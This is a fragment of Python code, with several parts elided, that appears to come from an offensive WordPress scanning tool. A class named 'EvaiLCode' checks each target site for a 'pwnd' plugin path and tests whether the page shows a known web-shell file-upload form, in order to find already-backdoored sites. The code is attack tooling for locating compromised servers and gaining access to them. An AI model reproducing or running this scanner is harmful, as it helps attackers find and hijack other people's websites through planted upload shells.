...
Pathlist = ['/wp-content/plugins/pwnd/pwnd.php', '/wp-content/plugins/pwnd-1/pwnd.php']
class EvaiLCode:
	def __init__(self):
	...
	def checker(self, site):
		try:
			...
			for Path in Pathlist:
				...
				if('<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file"><input name="_upl" type="submit" id="_upl" value="Upload"></form>' in check):
